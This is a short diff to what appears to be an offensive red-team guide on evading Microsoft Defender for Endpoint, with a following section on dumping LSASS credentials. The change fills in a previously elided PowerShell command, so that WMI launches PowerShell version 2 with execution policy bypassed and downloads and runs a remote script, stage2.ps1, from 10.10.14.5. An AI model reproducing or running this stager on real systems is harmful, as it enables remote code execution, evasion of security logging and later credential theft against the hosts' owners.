@@ -147,7 +147,7 @@ powershell.exe -version 2
 
 # 4. Downgrade via WMI or COM that spawns powershell:
 $wmi = [wmiclass]"Win32_Process"
-$wmi.Create("powershell.exe -version 2 -ep bypass -c IEX ...")
+$wmi.Create("powershell.exe -version 2 -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')")
 ```
 
 ## MDE-Aware LSASS Dumping
